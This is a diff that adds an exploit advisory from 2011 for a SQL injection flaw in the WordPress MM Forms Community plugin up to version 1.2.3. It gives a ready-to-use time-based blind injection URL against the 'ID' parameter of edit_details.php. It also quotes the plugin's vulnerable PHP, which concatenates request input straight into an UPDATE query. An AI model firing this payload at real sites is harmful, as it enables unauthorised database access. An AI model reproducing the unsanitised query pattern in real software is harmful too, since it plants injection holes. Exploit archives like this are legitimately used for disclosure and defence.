@@ -1,0 +1,21 @@
+# Exploit Title: WordPress MM Forms Community plugin <= 1.2.3 SQL Injection Vulnerability
+# Date: 2011-08-26
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/mm-forms-community.zip
+# Version: 1.2.3 (tested)
+# Note: magic_quotes has to be turned off
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/mm-forms-community/includes/edit_details.php?ID=-1' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+
+---------------
+Vulnerable code
+---------------
+foreach ($_REQUEST as $key => $value){
+	
+	
+	$SQL="UPDATE wp_contactform_submit_data SET value=".quoteString($value)." WHERE fk_form_joiner_id='".$_REQUEST['ID']."' AND form_key='".$key."'";
+	mysql_query($SQL);
+}
